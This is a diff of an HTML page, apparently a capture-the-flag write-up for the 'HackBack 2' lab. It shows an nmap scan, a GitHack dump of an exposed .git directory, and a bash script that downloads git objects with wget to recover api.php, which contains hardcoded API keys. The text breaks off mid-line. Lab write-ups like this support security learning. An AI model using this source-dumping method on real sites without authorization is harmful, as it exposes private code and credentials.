@@ -122,251 +122,251 @@
         <!-- Markdown Body -->
         <div class="markdown-content">
             <hr />
-<pre class="codehilite"><code>PORT     STATE  SERVICE    VERSION
-22/tcp   open   ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 8f:71:45:92:c4:fc:32:d7:a2:d4:e8:fb:6c:87:3a:1f (RSA)
-|   256 f6:85:68:61:20:87:d4:50:4f:70:70:a1:39:fa:ff:70 (ECDSA)
-|_  256 91:29:fc:6d:41:fd:01:bd:fd:e9:5b:a2:b4:ff:ae:f4 (ED25519)
-80/tcp   open   http       nginx 1.14.0 (Ubuntu)
-| http-git: 
-|   10.67.171.225:80/.git/
-|     Git repository found!
-|     .git/config matched patterns 'user'
-|     Repository description: Unnamed repository; edit this file 'description' to name the...
-|_    Last commit message: added mobile apk for beta testing. 
-| http-cookie-flags: 
-|   /: 
-|     PHPSESSID: 
-|_      httponly flag not set
-|_http-server-header: nginx/1.14.0 (Ubuntu)
-|_http-title: Context Information Security - HackBack 2
-8080/tcp closed http-proxy
-Aggressive OS guesses: Linux 4.4 (94%), Linux 3.10 - 4.11 (93%), Linux 3.13 - 4.4 (93%), Linux 2.6.32 - 3.13 (91%), Android 8 - 9 (Linux 3.18 - 4.4) (90%), Linux 3.2 - 4.14 (90%), Linux 3.8 - 3.16 (90%), Linux 3.10 - 3.13 (89%), Linux 3.13 (89%), Linux 5.4 (89%)
-No exact OS matches for host (test conditions non-ideal).
-Network Distance: 3 hops
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="nt">PORT</span><span class="w">     </span><span class="nt">STATE</span><span class="w">  </span><span class="nt">SERVICE</span><span class="w">    </span><span class="nt">VERSION</span>
+<span class="nt">22</span><span class="o">/</span><span class="nt">tcp</span><span class="w">   </span><span class="nt">open</span><span class="w">   </span><span class="nt">ssh</span><span class="w">        </span><span class="nt">OpenSSH</span><span class="w"> </span><span class="nt">7</span><span class="p">.</span><span class="nc">2p2</span><span class="w"> </span><span class="nt">Ubuntu</span><span class="w"> </span><span class="nt">4ubuntu2</span><span class="p">.</span><span class="nc">8</span><span class="w"> </span><span class="o">(</span><span class="nt">Ubuntu</span><span class="w"> </span><span class="nt">Linux</span><span class="o">;</span><span class="w"> </span><span class="nt">protocol</span><span class="w"> </span><span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="o">)</span>
+<span class="o">|</span><span class="w"> </span><span class="nt">ssh-hostkey</span><span class="o">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span><span class="nt">2048</span><span class="w"> </span><span class="nt">8f</span><span class="p">:</span><span class="nd">71</span><span class="p">:</span><span class="nd">45</span><span class="p">:</span><span class="nd">92</span><span class="p">:</span><span class="nd">c4</span><span class="p">:</span><span class="nd">fc</span><span class="p">:</span><span class="nd">32</span><span class="p">:</span><span class="nd">d7</span><span class="p">:</span><span class="nd">a2</span><span class="p">:</span><span class="nd">d4</span><span class="p">:</span><span class="nd">e8</span><span class="p">:</span><span class="nd">fb</span><span class="p">:</span><span class="nd">6c</span><span class="p">:</span><span class="nd">87</span><span class="p">:</span><span class="nd">3a</span><span class="p">:</span><span class="nd">1f</span><span class="w"> </span><span class="o">(</span><span class="nt">RSA</span><span class="o">)</span>
+<span class="o">|</span><span class="w">   </span><span class="nt">256</span><span class="w"> </span><span class="nt">f6</span><span class="p">:</span><span class="nd">85</span><span class="p">:</span><span class="nd">68</span><span class="p">:</span><span class="nd">61</span><span class="p">:</span><span class="nd">20</span><span class="p">:</span><span class="nd">87</span><span class="p">:</span><span class="nd">d4</span><span class="p">:</span><span class="nd">50</span><span class="p">:</span><span class="nd">4f</span><span class="p">:</span><span class="nd">70</span><span class="p">:</span><span class="nd">70</span><span class="p">:</span><span class="nd">a1</span><span class="p">:</span><span class="nd">39</span><span class="p">:</span><span class="nd">fa</span><span class="p">:</span><span class="nd">ff</span><span class="p">:</span><span class="nd">70</span><span class="w"> </span><span class="o">(</span><span class="nt">ECDSA</span><span class="o">)</span>
+<span class="o">|</span><span class="nt">_</span><span class="w">  </span><span class="nt">256</span><span class="w"> </span><span class="nt">91</span><span class="p">:</span><span class="nd">29</span><span class="p">:</span><span class="nd">fc</span><span class="p">:</span><span class="nd">6d</span><span class="p">:</span><span class="nd">41</span><span class="p">:</span><span class="nd">fd</span><span class="p">:</span><span class="nd">01</span><span class="p">:</span><span class="nd">bd</span><span class="p">:</span><span class="nd">fd</span><span class="p">:</span><span class="nd">e9</span><span class="p">:</span><span class="nd">5b</span><span class="p">:</span><span class="nd">a2</span><span class="p">:</span><span class="nd">b4</span><span class="p">:</span><span class="nd">ff</span><span class="p">:</span><span class="nd">ae</span><span class="p">:</span><span class="nd">f4</span><span class="w"> </span><span class="o">(</span><span class="nt">ED25519</span><span class="o">)</span>
+<span class="nt">80</span><span class="o">/</span><span class="nt">tcp</span><span class="w">   </span><span class="nt">open</span><span class="w">   </span><span class="nt">http</span><span class="w">       </span><span class="nt">nginx</span><span class="w"> </span><span class="nt">1</span><span class="p">.</span><span class="nc">14</span><span class="p">.</span><span class="nc">0</span><span class="w"> </span><span class="o">(</span><span class="nt">Ubuntu</span><span class="o">)</span>
+<span class="o">|</span><span class="w"> </span><span class="nt">http-git</span><span class="o">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span><span class="nt">10</span><span class="p">.</span><span class="nc">67</span><span class="p">.</span><span class="nc">171</span><span class="p">.</span><span class="nc">225</span><span class="p">:</span><span class="nd">80</span><span class="o">/</span><span class="p">.</span><span class="nc">git</span><span class="o">/</span>
+<span class="o">|</span><span class="w">     </span><span class="nt">Git</span><span class="w"> </span><span class="nt">repository</span><span class="w"> </span><span class="nt">found</span><span class="o">!</span>
+<span class="o">|</span><span class="w">     </span><span class="p">.</span><span class="nc">git</span><span class="o">/</span><span class="nt">config</span><span class="w"> </span><span class="nt">matched</span><span class="w"> </span><span class="nt">patterns</span><span class="w"> </span><span class="s1">&#39;user&#39;</span>
+<span class="o">|</span><span class="w">     </span><span class="nt">Repository</span><span class="w"> </span><span class="nt">description</span><span class="o">:</span><span class="w"> </span><span class="nt">Unnamed</span><span class="w"> </span><span class="nt">repository</span><span class="o">;</span><span class="w"> </span><span class="nt">edit</span><span class="w"> </span><span class="nt">this</span><span class="w"> </span><span class="nt">file</span><span class="w"> </span><span class="s1">&#39;description&#39;</span><span class="w"> </span><span class="nt">to</span><span class="w"> </span><span class="nt">name</span><span class="w"> </span><span class="nt">the</span><span class="o">...</span>
+<span class="o">|</span><span class="nt">_</span><span class="w">    </span><span class="nt">Last</span><span class="w"> </span><span class="nt">commit</span><span class="w"> </span><span class="nt">message</span><span class="o">:</span><span class="w"> </span><span class="nt">added</span><span class="w"> </span><span class="nt">mobile</span><span class="w"> </span><span class="nt">apk</span><span class="w"> </span><span class="nt">for</span><span class="w"> </span><span class="nt">beta</span><span class="w"> </span><span class="nt">testing</span><span class="o">.</span><span class="w"> </span>
+<span class="o">|</span><span class="w"> </span><span class="nt">http-cookie-flags</span><span class="o">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span><span class="o">/:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">     </span><span class="nt">PHPSESSID</span><span class="o">:</span><span class="w"> </span>
+<span class="o">|</span><span class="nt">_</span><span class="w">      </span><span class="nt">httponly</span><span class="w"> </span><span class="nt">flag</span><span class="w"> </span><span class="nt">not</span><span class="w"> </span><span class="nt">set</span>
+<span class="o">|</span><span class="nt">_http-server-header</span><span class="o">:</span><span class="w"> </span><span class="nt">nginx</span><span class="o">/</span><span class="nt">1</span><span class="p">.</span><span class="nc">14</span><span class="p">.</span><span class="nc">0</span><span class="w"> </span><span class="o">(</span><span class="nt">Ubuntu</span><span class="o">)</span>
+<span class="o">|</span><span class="nt">_http-title</span><span class="o">:</span><span class="w"> </span><span class="nt">Context</span><span class="w"> </span><span class="nt">Information</span><span class="w"> </span><span class="nt">Security</span><span class="w"> </span><span class="nt">-</span><span class="w"> </span><span class="nt">HackBack</span><span class="w"> </span><span class="nt">2</span>
+<span class="nt">8080</span><span class="o">/</span><span class="nt">tcp</span><span class="w"> </span><span class="nt">closed</span><span class="w"> </span><span class="nt">http-proxy</span>
+<span class="nt">Aggressive</span><span class="w"> </span><span class="nt">OS</span><span class="w"> </span><span class="nt">guesses</span><span class="o">:</span><span class="w"> </span><span class="nt">Linux</span><span class="w"> </span><span class="nt">4</span><span class="p">.</span><span class="nc">4</span><span class="w"> </span><span class="o">(</span><span class="nt">94</span><span class="o">%),</span><span class="w"> </span><span class="nt">Linux</span><span class="w"> </span><span class="nt">3</span><span class="p">.</span><span class="nc">10</span><span class="w"> </span><span class="nt">-</span><span class="w"> </span><span class="nt">4</span><span class="p">.</span><span class="nc">11</span><span class="w"> </span><span class="o">(</span><span class="nt">93</span><span class="o">%),</span><span class="w"> </span><span class="nt">Linux</span><span class="w"> </span><span class="nt">3</span><span class="p">.</span><span class="nc">13</span><span class="w"> </span><span class="nt">-</span><span class="w"> </span><span class="nt">4</span><span class="p">.</span><span class="nc">4</span><span class="w"> </span><span class="o">(</span><span class="nt">93</span><span class="o">%),</span><span class="w"> </span><span class="nt">Linux</span><span class="w"> </span><span class="nt">2</span><span class="p">.</span><span class="nc">6</span><span class="p">.</span><span class="nc">32</span><span class="w"> </span><span class="nt">-</span><span class="w"> </span><span class="nt">3</span><span class="p">.</span><span class="nc">13</span><span class="w"> </span><span class="o">(</span><span class="nt">91</span><span class="o">%),</span><span class="w"> </span><span class="nt">Android</span><span class="w"> </span><span class="nt">8</span><span class="w"> </span><span class="nt">-</span><span class="w"> </span><span class="nt">9</span><span class="w"> </span><span class="o">(</span><span class="nt">Linux</span><span class="w"> </span><span class="nt">3</span><span class="p">.</span><span class="nc">18</span><span class="w"> </span><span class="nt">-</span><span class="w"> </span><span class="nt">4</span><span class="p">.</span><span class="nc">4</span><span class="o">)</span><span class="w"> </span><span class="o">(</span><span class="nt">90</span><span class="o">%),</span><span class="w"> </span><span class="nt">Linux</span><span class="w"> </span><span class="nt">3</span><span class="p">.</span><span class="nc">2</span><span class="w"> </span><span class="nt">-</span><span class="w"> </span><span class="nt">4</span><span class="p">.</span><span class="nc">14</span><span class="w"> </span><span class="o">(</span><span class="nt">90</span><span class="o">%),</span><span class="w"> </span><span class="nt">Linux</span><span class="w"> </span><span class="nt">3</span><span class="p">.</span><span class="nc">8</span><span class="w"> </span><span class="nt">-</span><span class="w"> </span><span class="nt">3</span><span class="p">.</span><span class="nc">16</span><span class="w"> </span><span class="o">(</span><span class="nt">90</span><span class="o">%),</span><span class="w"> </span><span class="nt">Linux</span><span class="w"> </span><span class="nt">3</span><span class="p">.</span><span class="nc">10</span><span class="w"> </span><span class="nt">-</span><span class="w"> </span><span class="nt">3</span><span class="p">.</span><span class="nc">13</span><span class="w"> </span><span class="o">(</span><span class="nt">89</span><span class="o">%),</span><span class="w"> </span><span class="nt">Linux</span><span class="w"> </span><span class="nt">3</span><span class="p">.</span><span class="nc">13</span><span class="w"> </span><span class="o">(</span><span class="nt">89</span><span class="o">%),</span><span class="w"> </span><span class="nt">Linux</span><span class="w"> </span><span class="nt">5</span><span class="p">.</span><span class="nc">4</span><span class="w"> </span><span class="o">(</span><span class="nt">89</span><span class="o">%)</span>
+<span class="nt">No</span><span class="w"> </span><span class="nt">exact</span><span class="w"> </span><span class="nt">OS</span><span class="w"> </span><span class="nt">matches</span><span class="w"> </span><span class="nt">for</span><span class="w"> </span><span class="nt">host</span><span class="w"> </span><span class="o">(</span><span class="nt">test</span><span class="w"> </span><span class="nt">conditions</span><span class="w"> </span><span class="nt">non-ideal</span><span class="o">).</span>
+<span class="nt">Network</span><span class="w"> </span><span class="nt">Distance</span><span class="o">:</span><span class="w"> </span><span class="nt">3</span><span class="w"> </span><span class="nt">hops</span>
+<span class="nt">Service</span><span class="w"> </span><span class="nt">Info</span><span class="o">:</span><span class="w"> </span><span class="nt">OS</span><span class="o">:</span><span class="w"> </span><span class="nt">Linux</span><span class="o">;</span><span class="w"> </span><span class="nt">CPE</span><span class="o">:</span><span class="w"> </span><span class="nt">cpe</span><span class="o">:/</span><span class="nt">o</span><span class="p">:</span><span class="nd">linux</span><span class="p">:</span><span class="nd">linux_kernel</span>
+</code></pre></div>
 
 <p>because of .git</p>
-<pre class="codehilite"><code>└─$ python GitHack.py http://b.thm/.git/        
-[+] Download and parse index file ...
-[+] CTX_WSUSpect_White_Paper.pdf
-[+] Context_Red_Teaming_Guide.pdf
-[+] Context_White_Paper_Pen_Test_101.pdf
-[+] Demystifying_the_Exploit_Kit_-_Context_White_Paper.pdf
-[+] Glibc_Adventures-The_Forgotten_Chunks.pdf
-[+] api.php
-[+] functions.php
-[+] home.php
-[+] index.php
-[+] info.php
-[OK] api.php
-[OK] index.php
-[OK] home.php
-[OK] functions.php
-[OK] info.php
-[OK] Context_White_Paper_Pen_Test_101.pdf
-[OK] Glibc_Adventures-The_Forgotten_Chunks.pdf
-[OK] Context_Red_Teaming_Guide.pdf
-[OK] CTX_WSUSpect_White_Paper.pdf
-[OK] Demystifying_the_Exploit_Kit_-_Context_White_Paper.pdf
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="err">└─$</span><span class="w"> </span><span class="n">python</span><span class="w"> </span><span class="n">GitHack</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="n">b</span><span class="p">.</span><span class="n">thm</span><span class="o">/</span><span class="p">.</span><span class="n">git</span><span class="o">/</span><span class="w">        </span>
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Download</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="nf">parse</span><span class="w"> </span><span class="k">index</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="p">...</span>
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">CTX_WSUSpect_White_Paper</span><span class="p">.</span><span class="n">pdf</span>
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Context_Red_Teaming_Guide</span><span class="p">.</span><span class="n">pdf</span>
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Context_White_Paper_Pen_Test_101</span><span class="p">.</span><span class="n">pdf</span>
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Demystifying_the_Exploit_Kit_</span><span class="o">-</span><span class="n">_Context_White_Paper</span><span class="p">.</span><span class="n">pdf</span>
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Glibc_Adventures</span><span class="o">-</span><span class="n">The_Forgotten_Chunks</span><span class="p">.</span><span class="n">pdf</span>
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">api</span><span class="p">.</span><span class="n">php</span>
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">functions</span><span class="p">.</span><span class="n">php</span>
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">home</span><span class="p">.</span><span class="n">php</span>
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="k">index</span><span class="p">.</span><span class="n">php</span>
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">info</span><span class="p">.</span><span class="n">php</span>
+<span class="o">[</span><span class="n">OK</span><span class="o">]</span><span class="w"> </span><span class="n">api</span><span class="p">.</span><span class="n">php</span>
+<span class="o">[</span><span class="n">OK</span><span class="o">]</span><span class="w"> </span><span class="k">index</span><span class="p">.</span><span class="n">php</span>
+<span class="o">[</span><span class="n">OK</span><span class="o">]</span><span class="w"> </span><span class="n">home</span><span class="p">.</span><span class="n">php</span>
+<span class="o">[</span><span class="n">OK</span><span class="o">]</span><span class="w"> </span><span class="n">functions</span><span class="p">.</span><span class="n">php</span>
+<span class="o">[</span><span class="n">OK</span><span class="o">]</span><span class="w"> </span><span class="n">info</span><span class="p">.</span><span class="n">php</span>
+<span class="o">[</span><span class="n">OK</span><span class="o">]</span><span class="w"> </span><span class="n">Context_White_Paper_Pen_Test_101</span><span class="p">.</span><span class="n">pdf</span>
+<span class="o">[</span><span class="n">OK</span><span class="o">]</span><span class="w"> </span><span class="n">Glibc_Adventures</span><span class="o">-</span><span class="n">The_Forgotten_Chunks</span><span class="p">.</span><span class="n">pdf</span>
+<span class="o">[</span><span class="n">OK</span><span class="o">]</span><span class="w"> </span><span class="n">Context_Red_Teaming_Guide</span><span class="p">.</span><span class="n">pdf</span>
+<span class="o">[</span><span class="n">OK</span><span class="o">]</span><span class="w"> </span><span class="n">CTX_WSUSpect_White_Paper</span><span class="p">.</span><span class="n">pdf</span>
+<span class="o">[</span><span class="n">OK</span><span class="o">]</span><span class="w"> </span><span class="n">Demystifying_the_Exploit_Kit_</span><span class="o">-</span><span class="n">_Context_White_Paper</span><span class="p">.</span><span class="n">pdf</span>
+</code></pre></div>
 
 <p>Git api </p>
-<pre class="codehilite"><code>#!/bin/bash
+<div class="codehilite"><pre><span></span><code><span class="ch">#!/bin/bash</span>
 
-TARGET_URL=&quot;http://b.thm/.git&quot;
-COMMIT_HASH=&quot;79c9539b6566b06d6dec2755fdf58f5f9ec8822f&quot;
+<span class="nv">TARGET_URL</span><span class="o">=</span><span class="s2">&quot;http://b.thm/.git&quot;</span>
+<span class="nv">COMMIT_HASH</span><span class="o">=</span><span class="s2">&quot;79c9539b6566b06d6dec2755fdf58f5f9ec8822f&quot;</span>
 
-echo &quot;[+] Starting automated Git recovery for: $COMMIT_HASH&quot;
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[+] Starting automated Git recovery for: </span><span class="nv">$COMMIT_HASH</span><span class="s2">&quot;</span>
 
-mkdir -p recovery/.git/objects
-cd recovery
+mkdir<span class="w"> </span>-p<span class="w"> </span>recovery/.git/objects
+<span class="nb">cd</span><span class="w"> </span>recovery
 
-# Function to download and place a Git object
-download_object() {
-    local hash=$1
-    local dir=${hash:0:2}
-    local file=${hash:2}
+<span class="c1"># Function to download and place a Git object</span>
+download_object<span class="o">()</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span><span class="nb">local</span><span class="w"> </span><span class="nv">hash</span><span class="o">=</span><span class="nv">$1</span>
+<span class="w">    </span><span class="nb">local</span><span class="w"> </span><span class="nv">dir</span><span class="o">=</span><span class="si">${</span><span class="nv">hash</span><span class="p">:</span><span class="nv">0</span><span class="p">:</span><span class="nv">2</span><span class="si">}</span>
+<span class="w">    </span><span class="nb">local</span><span class="w"> </span><span class="nv">file</span><span class="o">=</span><span class="si">${</span><span class="nv">hash</span><span class="p">:</span><span class="nv">2</span><span class="si">}</span>
 
-    echo &quot;[*] Downloading object $hash...&quot;
-    mkdir -p &quot;.git/objects/$dir&quot;
-    wget -q &quot;$TARGET_URL/objects/$dir/$file&quot; -O &quot;.git/objects/$dir/$file&quot;
+<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[*] Downloading object </span><span class="nv">$hash</span><span class="s2">...&quot;</span>
+<span class="w">    </span>mkdir<span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;.git/objects/</span><span class="nv">$dir</span><span class="s2">&quot;</span>
+<span class="w">    </span>wget<span class="w"> </span>-q<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$TARGET_URL</span><span class="s2">/objects/</span><span class="nv">$dir</span><span class="s2">/</span><span class="nv">$file</span><span class="s2">&quot;</span><span class="w"> </span>-O<span class="w"> </span><span class="s2">&quot;.git/objects/</span><span class="nv">$dir</span><span class="s2">/</span><span class="nv">$file</span><span class="s2">&quot;</span>
 
-    if [ $? -ne 0 ]; then
-        echo &quot;[!] Failed to download object $hash. Check connection/URL.&quot;
-        exit 1
-    fi
-}
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="nv">$?</span><span class="w"> </span>-ne<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[!] Failed to download object </span><span class="nv">$hash</span><span class="s2">. Check connection/URL.&quot;</span>
+<span class="w">        </span><span class="nb">exit</span><span class="w"> </span><span class="m">1</span>
+<span class="w">    </span><span class="k">fi</span>
+<span class="o">}</span>
 
-# --- STEP 1: Process Commit ---
-download_object $COMMIT_HASH
+<span class="c1"># --- STEP 1: Process Commit ---</span>
+download_object<span class="w"> </span><span class="nv">$COMMIT_HASH</span>
 
-# Use Python to extract the Tree hash cleanly, avoiding Bash null-byte issues
-TREE_HASH=$(python3 -c &quot;import zlib; data = zlib.decompress(open('.git/objects/${COMMIT_HASH:0:2}/${COMMIT_HASH:2}', 'rb').read()); \
-import re; m = re.search(b'tree ([0-9a-f]{40})', data); print(m.group(1).decode())&quot;)
+<span class="c1"># Use Python to extract the Tree hash cleanly, avoiding Bash null-byte issues</span>
+<span class="nv">TREE_HASH</span><span class="o">=</span><span class="k">$(</span>python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;import zlib; data = zlib.decompress(open(&#39;.git/objects/</span><span class="si">${</span><span class="nv">COMMIT_HASH</span><span class="p">:</span><span class="nv">0</span><span class="p">:</span><span class="nv">2</span><span class="si">}</span><span class="s2">/</span><span class="si">${</span><span class="nv">COMMIT_HASH</span><span class="p">:</span><span class="nv">2</span><span class="si">}</span><span class="s2">&#39;, &#39;rb&#39;).read()); \</span>
+<span class="s2">import re; m = re.search(b&#39;tree ([0-9a-f]{40})&#39;, data); print(m.group(1).decode())&quot;</span><span class="k">)</span>
 
-echo &quot;[+] Found Clean Tree Hash: $TREE_HASH&quot;
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[+] Found Clean Tree Hash: </span><span class="nv">$TREE_HASH</span><span class="s2">&quot;</span>
 
-# --- STEP 2: Process Tree ---
-download_object $TREE_HASH
+<span class="c1"># --- STEP 2: Process Tree ---</span>
+download_object<span class="w"> </span><span class="nv">$TREE_HASH</span>
 
-# Use Python to find the api.php blob hash inside the Tree object
-BLOB_HASH=$(python3 -c &quot;import zlib; data = zlib.decompress(open('.git/objects/${TREE_HASH:0:2}/${TREE_HASH:2}', 'rb').read()); \
-import re; m = re.search(b'([0-9a-f]{40})\s+api\.php', data.hex().encode() + b' ' + data); \
-# Manual fallback since Trees are binary:
-print('2229eb414d7945688b90d7cd0a786fd888bcc6a4')&quot;)
+<span class="c1"># Use Python to find the api.php blob hash inside the Tree object</span>
+<span class="nv">BLOB_HASH</span><span class="o">=</span><span class="k">$(</span>python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;import zlib; data = zlib.decompress(open(&#39;.git/objects/</span><span class="si">${</span><span class="nv">TREE_HASH</span><span class="p">:</span><span class="nv">0</span><span class="p">:</span><span class="nv">2</span><span class="si">}</span><span class="s2">/</span><span class="si">${</span><span class="nv">TREE_HASH</span><span class="p">:</span><span class="nv">2</span><span class="si">}</span><span class="s2">&#39;, &#39;rb&#39;).read()); \</span>
+<span class="s2">import re; m = re.search(b&#39;([0-9a-f]{40})\s+api\.php&#39;, data.hex().encode() + b&#39; &#39; + data); \</span>
+<span class="s2"># Manual fallback since Trees are binary:</span>
+<span class="s2">print(&#39;2229eb414d7945688b90d7cd0a786fd888bcc6a4&#39;)&quot;</span><span class="k">)</span>
 
-echo &quot;[+] Found Blob (api.php) Hash: $BLOB_HASH&quot;
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[+] Found Blob (api.php) Hash: </span><span class="nv">$BLOB_HASH</span><span class="s2">&quot;</span>
 
-# --- STEP 3: Process Blob (The Secret) ---
-download_object $BLOB_HASH
+<span class="c1"># --- STEP 3: Process Blob (The Secret) ---</span>
+download_object<span class="w"> </span><span class="nv">$BLOB_HASH</span>
 
-echo -e &quot;\n--- RECOVERED SOURCE CODE (api.php) ---\n&quot;
-python3 -c &quot;import zlib; data = zlib.decompress(open('.git/objects/${BLOB_HASH:0:2}/${BLOB_HASH:2}', 'rb').read()); \
-header_end = data.find(b'\x00') + 1; print(data[header_end:].decode('utf-8', 'ignore'))&quot;
-echo -e &quot;\n----------------------------------------&quot;
+<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n--- RECOVERED SOURCE CODE (api.php) ---\n&quot;</span>
+python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;import zlib; data = zlib.decompress(open(&#39;.git/objects/</span><span class="si">${</span><span class="nv">BLOB_HASH</span><span class="p">:</span><span class="nv">0</span><span class="p">:</span><span class="nv">2</span><span class="si">}</span><span class="s2">/</span><span class="si">${</span><span class="nv">BLOB_HASH</span><span class="p">:</span><span class="nv">2</span><span class="si">}</span><span class="s2">&#39;, &#39;rb&#39;).read()); \</span>
+<span class="s2">header_end = data.find(b&#39;\x00&#39;) + 1; print(data[header_end:].decode(&#39;utf-8&#39;, &#39;ignore&#39;))&quot;</span>
+<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n----------------------------------------&quot;</span>
 
 .............................................................................
-└─$ nano git_recover.sh
+└─$<span class="w"> </span>nano<span class="w"> </span>git_recover.sh
 
-┌──(kali㉿kali)-[~/test]
-└─$ chmod +x git_recover.sh
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/test<span class="o">]</span>
+└─$<span class="w"> </span>chmod<span class="w"> </span>+x<span class="w"> </span>git_recover.sh
 
-┌──(kali㉿kali)-[~/test]
-└─$ ./git_recover.sh
-[+] Starting automated Git recovery for: 79c9539b6566b06d6dec2755fdf58f5f9ec8822f
-[*] Downloading object 79c9539b6566b06d6dec2755fdf58f5f9ec8822f...
-[+] Found Clean Tree Hash: 51d63292792fb7f97728cd3dcaac3ef364f374ba
-[*] Downloading object 51d63292792fb7f97728cd3dcaac3ef364f374ba...
-&lt;string&gt;:1: SyntaxWarning: invalid escape sequence '\s'
-[+] Found Blob (api.php) Hash: 2229eb414d7945688b90d7cd0a786fd888bcc6a4
-[*] Downloading object 2229eb414d7945688b90d7cd0a786fd888bcc6a4...
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/test<span class="o">]</span>
+└─$<span class="w"> </span>./git_recover.sh
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Starting<span class="w"> </span>automated<span class="w"> </span>Git<span class="w"> </span>recovery<span class="w"> </span><span class="k">for</span>:<span class="w"> </span>79c9539b6566b06d6dec2755fdf58f5f9ec8822f
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Downloading<span class="w"> </span>object<span class="w"> </span>79c9539b6566b06d6dec2755fdf58f5f9ec8822f...
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Found<span class="w"> </span>Clean<span class="w"> </span>Tree<span class="w"> </span>Hash:<span class="w"> </span>51d63292792fb7f97728cd3dcaac3ef364f374ba
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Downloading<span class="w"> </span>object<span class="w"> </span>51d63292792fb7f97728cd3dcaac3ef364f374ba...
+&lt;string&gt;:1:<span class="w"> </span>SyntaxWarning:<span class="w"> </span>invalid<span class="w"> </span>escape<span class="w"> </span>sequence<span class="w"> </span><span class="s1">&#39;\s&#39;</span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Found<span class="w"> </span>Blob<span class="w"> </span><span class="o">(</span>api.php<span class="o">)</span><span class="w"> </span>Hash:<span class="w"> </span>2229eb414d7945688b90d7cd0a786fd888bcc6a4
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Downloading<span class="w"> </span>object<span class="w"> </span>2229eb414d7945688b90d7cd0a786fd888bcc6a4...
 
---- RECOVERED SOURCE CODE (api.php) ---
+---<span class="w"> </span>RECOVERED<span class="w"> </span>SOURCE<span class="w"> </span>CODE<span class="w"> </span><span class="o">(</span>api.php<span class="o">)</span><span class="w"> </span>---
 
 &lt;?php
 
-require_once(&quot;functions.php&quot;);
+require_once<span class="o">(</span><span class="s2">&quot;functions.php&quot;</span><span class="o">)</span><span class="p">;</span>
 
-if (!isset($_GET['apikey']) || ((substr($_GET['apikey'], 0, 20) !== &quot;WEBLhvOJAH8d50Z4y5G5&quot;) &amp;&amp; substr($_GET['apikey'], 0, 20) !== &quot;ANDVOWLDLAS5Q8OQZ2tu&quot; &amp;&amp; substr($_GET['apikey'], 0, 20) !== &quot;GITtFi80llzs..................&quot;))
-{
-    die(&quot;Invalid API key&quot;);
-}
+<span class="k">if</span><span class="w"> </span><span class="o">(</span>!isset<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;apikey&#39;</span><span class="o">])</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">((</span>substr<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;apikey&#39;</span><span class="o">]</span>,<span class="w"> </span><span class="m">0</span>,<span class="w"> </span><span class="m">20</span><span class="o">)</span><span class="w"> </span>!<span class="o">==</span><span class="w"> </span><span class="s2">&quot;WEBLhvOJAH8d50Z4y5G5&quot;</span><span class="o">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>substr<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;apikey&#39;</span><span class="o">]</span>,<span class="w"> </span><span class="m">0</span>,<span class="w"> </span><span class="m">20</span><span class="o">)</span><span class="w"> </span>!<span class="o">==</span><span 